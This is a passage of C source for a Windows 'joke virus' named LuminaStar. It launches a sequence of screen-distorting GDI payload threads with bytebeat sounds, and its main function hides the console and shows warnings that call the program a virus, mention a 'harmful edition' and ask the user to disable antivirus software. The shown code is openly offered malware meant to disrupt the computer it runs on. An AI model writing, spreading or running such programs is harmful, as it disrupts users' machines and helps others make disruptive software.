	HANDLE thread9_num2 = CreateThread(0, 0, bitchtriangle, 0, 0, 0);
	sound9();
	TerminateThread(thread9_num1, 0);
	TerminateThread(thread9_num2, 0);
	refreshscr();
	HANDLE thread10 = CreateThread(0, 0, sharpen, 0, 0, 0);
	sound10();
	TerminateThread(thread10, 0);
	refreshscr();
	HANDLE thread11 = CreateThread(0, 0, shader5, 0, 0, 0);
	sound11();
	TerminateThread(thread11, 0);
	refreshscr();
	HANDLE thread12 = CreateThread(0, 0, drawbytebeat3, 0, 0, 0);
	sound12();
	TerminateThread(thread12, 0);
	refreshscr();
	HANDLE thread13 = CreateThread(0, 0, shader6, 0, 0, 0);
	sound13();
	TerminateThread(thread13, 0);
	refreshscr();
	HANDLE thread14_num1 = CreateThread(0, 0, bitchscreenrotate, 0, 0, 0);
	HANDLE thread14_num2 = CreateThread(0, 0, rndicon, 0, 0, 0);
	sound14();
	TerminateThread(thread14_num1, 0);
	TerminateThread(thread14_num2, 0);
	refreshscr();
	HANDLE thread15_num1 = CreateThread(0, 0, strangetunnel, 0, 0, 0);
	HANDLE thread15_num2 = CreateThread(0, 0, crazyrgb, 0, 0, 0);
	HANDLE thread15_num3 = CreateThread(0, 0, gradientfilltriangle, 0, 0, 0);
	sound15();
	TerminateThread(thread15_num1, 0);
	TerminateThread(thread15_num2, 0);
	TerminateThread(thread15_num3, 0);
	refreshscr();
	HANDLE thread16_num1 = CreateThread(0, 0, me1tin9, 0, 0, 0);
	HANDLE thread16_num2 = CreateThread(0, 0, transparentcircle, 0, 0, 0);
	sound16();
	TerminateThread(thread16_num1, 0);
	TerminateThread(thread16_num2, 0);
	TerminateThread(thread0, 0);
	TerminateThread(thread0copy, 0);
	TerminateThread(thread3_num2, 0);
	TerminateThread(thread8_num3, 0);
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxA(NULL, "Warning! This program is a computer virus that known as 'LuminaStar'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "LuminaStar.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus(LambdaTechnology) isn't responsible!!!", L"LuminaStar.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			mainpayloads();
		}
	}
	return 0;
}